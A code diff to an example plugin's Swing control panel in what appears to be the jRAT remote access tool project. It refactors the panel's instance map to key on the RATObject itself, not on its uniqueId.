@@ -17,6 +17,7 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.ScrollPaneConstants;
 
 import jrat.api.BaseControlPanel;
+import jrat.api.RATObject;
 import jrat.plugin.example.client.AskPacket;
 import jrat.plugin.example.client.ExampleClientPlugin;
 
@@ -26,7 +27,7 @@ public class ExampleControlPanel extends BaseControlPanel {
 	/**
 	 * Instances to get correct panel from RATObject uniqueId 
 	 */
-	public static final Map<Long, ExampleControlPanel> INSTANCES = new HashMap<Long, ExampleControlPanel>();
+	public static final Map<RATObject, ExampleControlPanel> INSTANCES = new HashMap<RATObject, ExampleControlPanel>();
 	
 	private JTextField txtQuestion;
 	private JTextPane txtMessage;
@@ -126,7 +127,7 @@ public class ExampleControlPanel extends BaseControlPanel {
 	 */
 	@Override
 	public void onLoad() {
-		INSTANCES.put(super.getServer().getUniqueId(), this);
+		INSTANCES.put(super.getServer(), this);
 	}
 
 	/**
@@ -134,7 +135,7 @@ public class ExampleControlPanel extends BaseControlPanel {
 	 */
 	@Override
 	public void onClose() {
-		INSTANCES.remove(super.getServer().getUniqueId());
+		INSTANCES.remove(super.getServer());
 	}
 
 	public JTextPane getAnswerTextField() {
